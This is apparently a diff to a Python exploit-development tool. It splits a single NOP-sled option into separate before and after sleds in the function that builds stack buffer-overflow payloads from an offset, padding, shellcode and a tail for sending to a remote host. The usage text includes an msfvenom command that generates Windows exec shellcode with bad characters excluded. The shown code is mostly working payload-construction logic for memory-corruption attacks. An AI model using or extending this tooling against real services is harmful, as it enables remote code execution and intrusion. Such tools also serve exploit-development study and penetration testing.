@@ -73,7 +73,7 @@ def print_usage(scriptName):
 	print(" --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.")
 	print(" --shellcode	: Hex shell code file generated using msfvenom. Example:")
 	print("		msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f hex EXITFUNC=thread -o opencalc")
-	print(" --nops		: Amount of nops to add before and after the addition write content (be if badchars, shellcode or simple hexstring). Default is 0.")
+	print(" --nopsb|nopsa	: Amount of nops to add before and/or after the additional write content (be if badchars, shellcode or simple hexstring). Default is 0.")
 	print(" --value		: Offset value.")
 	print(" --length	: Cyclic pattern length.")
 
@@ -226,18 +226,19 @@ def create_write_payload(buffHead, buffSize, offsetCount, binContent):
 	return payload
 
 # write - additional content (before or after hexcontent at offset)
-def create_write_payload_additional(buffHead, buffSize, offsetCount, binContent, beforeContent, afterContent, nopsSize = 0):	
+def create_write_payload_additional(buffHead, buffSize, offsetCount, binContent, beforeContent, afterContent, nopsbSize = 0, nopsaSize = 0):	
 	# nops
-	nops = b'\x90' * nopsSize
+	nopsb = b'\x90' * nopsbSize
+	nopsa = b'\x90' * nopsaSize
 
 	# offset
-	offset = b'A' * (offsetCount - len(nops) - len(beforeContent) - len(nops) )
+	offset = b'A' * (offsetCount - len(nopsb) - len(beforeContent) - len(nopsb) )
 
 	# tail
-	tail = b'Z' * (buffSize - len(offset) - len(nops) - len(beforeContent) - len(nops) - len(binContent) - len(nops) - len(afterContent) - len(nops))
+	tail = b'Z' * (buffSize - len(offset) - len(nopsb) - len(beforeContent) - len(nopsb) - len(binContent) - len(nopsa) - len(afterContent) - len(nopsa))
 	
 	# payload
-	payload = buffHead + offset + nops + beforeContent + nops + binContent + nops + afterContent + nops + tail		
+	payload = buffHead + offset + nopsb + beforeContent + nopsb + binContent + nopsa + afterContent + nopsa + tail		
 
 	return payload
 
@@ -255,7 +256,7 @@ if __name__ == "__main__":
 
 	# Input parameters
 	try:
-		opts, args = getopt.getopt(sys.argv[1:], "hnvm:", ["help", "norec", "verbose", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "before=", "after=", "exclude=", "shellcode=", "nops=", "interact=", "value=", "length="])
+		opts, args = getopt.getopt(sys.argv[1:], "hnvm:", ["help", "norec", "verbose", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "before=", "after=", "exclude=", "shellcode=", "nopsb=", "nopsa=", "interact=", "value=", "length="])
 	except getopt.GetoptError as err:
 		print("Error:", err)
 		print_usage(scriptName)
@@ -277,7 +278,8 @@ if __name__ == "__main__":
 	badCharExcluded = ""
 	shellCodeFile = ""
 	
-	nops = 0
+	nopsa = 0
+	nopsb = 0
 	interact = []
 	
 	patternValue = ""
@@ -321,8 +323,10 @@ if __name__ == "__main__":
 			badCharExcluded = value
 		elif opt == '--shellcode':
 			shellCodeFile = value
-		elif opt == '--nops':
-			nops = int(value)
+		elif opt == '--nopsa':
+			nopsa = int(value)
+		elif opt == '--nopsb':
+			nopsb = int(value)
 		elif opt == '--interact':
 			interact = value.split(";;")
 		elif opt == '--value':
@@ -334,7 +338,7 @@ if __name__ == "__main__":
 			print_usage(scriptName)
 			sys.exit(1)
 
-	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | before={} | after={} | exclude={} | shellcode={} | nops={} | interact={} | value={} | length={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, before, after, badCharExcluded, shellCodeFile, nops, interact, patternValue, patternLength)) if VERBOSE else None
+	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | before={} | after={} | exclude={} | shellcode={} | nopsb={} | nopsa={} | interact={} | value={} | length={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, before, after, badCharExcluded, shellCodeFile, nopsb, nopsa, interact, patternValue, patternLength)) if VERBOSE else None
 
 	# Tool
 	if not mode:
@@ -397,7 +401,7 @@ if __name__ == "__main__":
 		
 		if beforeContent or afterContent:
 			# Write additional
-			buffPayload = create_write_payload_additional(buffHead, buffSize, offset, binContent, beforeContent, afterContent, nops)
+			buffPayload = create_write_payload_additional(buffHead, buffSize, offset, binContent, beforeContent, afterContent, nopsb, nopsa)
 		else:
 			# Simple write
 			buffPayload = create_write_payload(buffHead, buffSize, offset, binContent)
